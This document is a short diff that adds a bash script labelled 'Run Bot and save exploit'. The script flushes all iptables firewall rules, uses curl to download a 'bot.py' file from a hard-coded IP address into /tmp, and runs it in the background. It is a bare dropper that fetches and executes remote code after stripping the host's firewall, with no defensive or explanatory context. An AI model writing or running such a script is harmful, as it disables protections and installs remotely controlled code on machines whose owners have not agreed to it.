@@ -1,0 +1,11 @@
+#!/bin/bash
+
+BOT_PATH="10.80.100.42/bot.py"
+SAVE_PATH="/tmp/"
+
+#Run Bot and save exploit
+iptables -F
+mkdir -p "$SAVE_PATH/"
+curl $BOT_PATH > "$SAVE_PATH/bot"
+python "$SAVE_PATH/bot" &
+
